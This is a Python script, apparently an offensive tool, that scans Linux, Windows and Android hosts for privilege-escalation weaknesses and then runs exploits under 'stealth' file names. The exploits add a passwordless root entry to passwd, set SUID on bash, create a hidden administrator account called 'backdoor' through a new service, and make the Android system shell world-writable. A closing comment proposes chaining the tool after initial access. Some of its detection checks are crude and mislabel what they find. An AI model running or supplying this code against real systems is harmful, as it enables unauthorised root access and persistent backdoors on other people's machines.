import os
import subprocess
import time
import random
import string
import platform
import sys

# ✅ Configurable stealth settings
SAFE_MODE = True  # If False, exploits will auto-run without confirmation
CUSTOM_NAME = True  # If True, allows custom service/binary names

# ✅ Generate random names for stealth
def random_name(extension=""):
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + extension

# ✅ Execute shell commands and return output
def run_command(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, text=True).strip()
    except subprocess.CalledProcessError:
        return None

# ✅ Detect OS
def detect_os():
    os_type = platform.system().lower()
    if "linux" in os_type:
        return "linux"
    elif "windows" in os_type:
        return "windows"
    elif "android" in os_type:
        return "android"
    else:
        return None

# ✅ Check for Linux privilege escalation methods
def check_linux_priv_esc():
    print("\n[*] Checking Linux privilege escalation methods...\n")
    findings = []

    # ✅ SUID Binaries
    suid_binaries = run_command("find / -perm -4000 -type f 2>/dev/null")
    if suid_binaries:
        findings.append("[+] SUID binaries found:\n" + suid_binaries)

    # ✅ Writable /etc/passwd
    if run_command("test -w /etc/passwd && echo 'yes'") == "yes":
        findings.append("[+] /etc/passwd is writable (potential user escalation).")

    # ✅ Writable /etc/shadow
    if run_command("test -w /etc/shadow && echo 'yes'") == "yes":
        findings.append("[+] /etc/shadow is writable (change root password).")

    # ✅ Check for vulnerable cron jobs
    cron_jobs = run_command("ls -la /etc/cron* 2>/dev/null")
    if cron_jobs:
        findings.append("[+] Cron jobs detected:\n" + cron_jobs)

    # ✅ Unquoted service paths
    services = run_command("systemctl list-units --type=service --all | grep '.service'")
    if services and " " in services:
        findings.append("[+] Unquoted service paths detected.")

    return findings

# ✅ Exploit Linux privilege escalation (User-confirmed)
def exploit_linux():
    print("\n[*] Exploiting Linux privilege escalation...\n")

    if CUSTOM_NAME:
        bin_name = input("[?] Enter stealth binary name (default: rootkit): ") or "rootkit"
    else:
        bin_name = random_name()

    exploit_script = f"""
    #!/bin/bash
    echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd
    chmod u+s /bin/bash
    """

    with open(bin_name, "w") as f:
        f.write(exploit_script)

    os.system(f"chmod +x {bin_name} && ./{bin_name}")
    print(f"[+] Exploit executed: {bin_name}")

# ✅ Check for Windows privilege escalation methods
def check_windows_priv_esc():
    print("\n[*] Checking Windows privilege escalation methods...\n")
    findings = []

    # ✅ Check for AlwaysInstallElevated
    install_elevated = run_command("reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated")
    if "0x1" in str(install_elevated):
        findings.append("[+] AlwaysInstallElevated is enabled (Easy PrivEsc).")

    # ✅ Check for unquoted service paths
    services = run_command("wmic service get name,displayname,pathname | findstr /i \"C:\\\"")
    if services and " " in services:
        findings.append("[+] Unquoted service paths detected.")

    # ✅ Check for writable services
    writable_services = run_command("wmic service get name,startmode | findstr /i \"auto\"")
    if writable_services:
        findings.append("[+] Writable services detected.")

    return findings

# ✅ Exploit Windows privilege escalation (User-confirmed)
def exploit_windows():
    print("\n[*] Exploiting Windows privilege escalation...\n")

    if CUSTOM_NAME:
        service_name = input("[?] Enter stealth service name (default: stealth_svc): ") or "stealth_svc"
    else:
        service_name = random_name()

    exploit_script = f"""
    @echo off
    net user backdoor P@ssw0rd123 /add
    net localgroup Administrators backdoor /add
    sc create {service_name} binPath= "cmd.exe /c net user backdoor P@ssw0rd123 /add && net localgroup Administrators backdoor /add"
    sc start {service_name}
    """

    with open(f"{service_name}.bat", "w") as f:
        f.write(exploit_script)

    os.system(f"cmd /c {service_name}.bat")
    print(f"[+] Exploit executed: {service_name}.bat")

# ✅ Check for Android privilege escalation methods
def check_android_priv_esc():
    print("\n[*] Checking Android privilege escalation methods...\n")
    findings = []

    # ✅ Check if ADB is enabled
    adb_check = run_command("getprop ro.adb.secure")
    if adb_check == "0":
        findings.append("[+] ADB is running in insecure mode (root access possible).")

    # ✅ Check if system partition is writable
    writable_sys = run_command("mount | grep ' /system ' | grep -o 'rw'")
    if writable_sys:
        findings.append("[+] System partition is writable (easy root access).")

    return findings

# ✅ Exploit Android privilege escalation (User-confirmed)
def exploit_android():
    print("\n[*] Exploiting Android privilege escalation...\n")

    if CUSTOM_NAME:
        exploit_name = input("[?] Enter stealth exploit name (default: rootme): ") or "rootme"
    else:
        exploit_name = random_name()

    exploit_script = f"""
    #!/bin/sh
    mount -o rw,remount /system
    echo 'root::0:0:root:/root:/bin/sh' >> /system/etc/passwd
    chmod 777 /system/bin/sh
    """

    with open(exploit_name, "w") as f:
        f.write(exploit_script)

    os.system(f"chmod +x {exploit_name} && ./{exploit_name}")
    print(f"[+] Exploit executed: {exploit_name}")

# ✅ Main Menu
def main():
    os_type = detect_os()
    if not os_type:
        print("[!] Unsupported OS detected. Exiting.")
        sys.exit(1)

    print(f"\n[🔥] Running Privilege Escalation Tool on {os_type.upper()}")

    if os_type == "linux":
        findings = check_linux_priv_esc()
        if findings:
            print("\n".join(findings))
            if not SAFE_MODE:
                exploit_linux()
    elif os_type == "windows":
        findings = check_windows_priv_esc()
        if findings:
            print("\n".join(findings))
            if not SAFE_MODE:
                exploit_windows()
    elif os_type == "android":
        findings = check_android_priv_esc()
        if findings:
            print("\n".join(findings))
            if not SAFE_MODE:
                exploit_android()

if __name__ == "__main__":
    main()







'''
2️⃣ Chain the Privesc Tool Manually (Interactive Mode)

    Once access is gained, the user could choose to run privesc:

    if input("[*] Do you want to escalate privileges? (y/n): ").lower() == "y":
        os.system("python3 privesc.py")

3️⃣ Add a Privesc Module Inside This Tool

    Modify this tool to have an extra option in the menu:

[5] Run Privilege Escalation Scan


'''